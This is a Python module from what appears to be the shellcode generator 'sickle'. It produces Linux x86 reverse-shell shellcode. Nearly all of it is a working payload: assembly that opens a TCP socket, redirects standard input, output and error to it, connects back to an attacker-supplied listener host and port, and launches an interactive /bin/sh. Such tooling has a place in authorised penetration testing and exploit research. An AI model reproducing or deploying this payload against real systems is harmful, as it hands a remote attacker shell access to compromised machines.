from sickle.common.lib.reversing.assembler import Assembler

from sickle.common.lib.generic.mparser import argument_check
from sickle.common.lib.generic.convert import ip_str_to_inet_addr
from sickle.common.lib.generic.convert import port_str_to_htons

import sys
import struct
import binascii

class Shellcode():

    name = "Linux (x86) SH Reverse Shell"

    module = "linux/x86/shell_reverse_tcp"

    example_run = f"{sys.argv[0]} -p {module} LHOST=125.0.0.1 LPORT=42 -f c"

    platform = "Linux"

    arch = "x86"
    
    ring = 3

    author = ["wetw0rk"]

    tested_platforms = ["Kali Linux"]

    summary = "TCP based reverse shell over IPV4 which returns an interactive /bin/sh"
    summary += " session (Linux x86)"

    description = """
    Simple reverse shellcode that will spawn a connection back to a listening tcp
    server. Connection is made via TCP over IPV4.
    """

    arguments = {}

    arguments["LHOST"] = {}
    arguments["LHOST"]["optional"] = "no"
    arguments["LHOST"]["description"] = "Listener host to receive the callback"

    arguments["LPORT"] = {}
    arguments["LPORT"]["optional"] = "yes"
    arguments["LPORT"]["description"] = "Listening port on listener host"

    def __init__(self, arg_object):

        self.arg_list = arg_object["positional arguments"]

    def get_shellcode(self):
        """TODO
        """

        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
        if (argv_dict == None):
            exit(-1)

        if ("LPORT" not in argv_dict.keys()):
            lport = 4444
        else:
            lport = argv_dict["LPORT"]

        sc_builder = Assembler(Shellcode.arch)

        source_code = (
        """
        start:
            ; int syscall(SYS_socketcall,      // EAX => socketcall syscall
            ;             int call,            // EBX => SYS_SOCKET
            ;             unsigned long *args) // ECX => *(int domain, int type, protocol)
            
            xor ebx, ebx
            mul ebx
            push ebx
            inc ebx      ; Store the call type of SYS_SOCKET into EBX
            push ebx
            push 0x02
            mov ecx, esp ; Store pointer to args (AF_INET, SOCK_STREAM, IPPROTO_IP) into ECX
            mov al, 0x66 ; Set the syscall number of socketcall into EAX
            int 0x80

            ; i = 2
            ; while (i <= 0)
            ;   dup2(sockfd, i--)
            
            xchg eax, ebx ; Save the socket file descriptor into ECX (sockfd)
            pop ecx       ; Initialize the loop counter (0x2 was last pushed onto the stack)
        loop:
            mov al, 0x3f  ; Store the syscall number for dup2 syscall into EAX
            int 0x80
            dec ecx       ; Decrement the loop counter
            jns loop

        connect:
            ; int syscall(SYS_socketcall,      // EAX => socketcall syscall
            ;             int call,            // EBX => SYS_CONNECT
            ;             unsigned long *args) // ECX => *(sockfd, (struct sockaddr*), sizeof((struct sockaddr *))
            
            push {}               ; client.sin_addr.s_addr = inet_addr(LHOST)
            push {}0002           ; client.sin_port = htons(LPORT)
                                  ; client.sin_family = AF_INET
            
            mov ecx, esp          ; Store the pointer to the sockaddr struct into ECX

            mov al, 0x66          ; sizeof(client) / socketcall syscall
            
            push eax              ; sizeof(client)
            push ecx              ; *args
            push ebx              ; sockfd

            mov bl, 3             ; Store call type of SYS_CONNECT into EBX
            
            mov ecx,esp           ; Store pointer to args (sockfd, (struct sockaddr *)&client, sizeof(client)) into ECX
            int 0x80

        shell:
            ; int execve(const char *filename, // EBX => *"/bin/sh
            ;            char *const argv[],   // ECX => NULL
            ;            char *const envp[])   // EDX => NULL
            xor ecx, ecx
            push ecx
            push dword 0x68732f2f
            push dword 0x6e69622f ; Stack should not point to "/bin//sh"

            mov ebx,esp           ; Place pointer to "/bin//sh" into EBX
            mov al,0xb            ; execve syscall
            int 0x80
        """
        ).format(hex(ip_str_to_inet_addr(argv_dict["LHOST"])),
                 hex(port_str_to_htons(lport)))


        return sc_builder.get_bytes_from_asm(source_code)
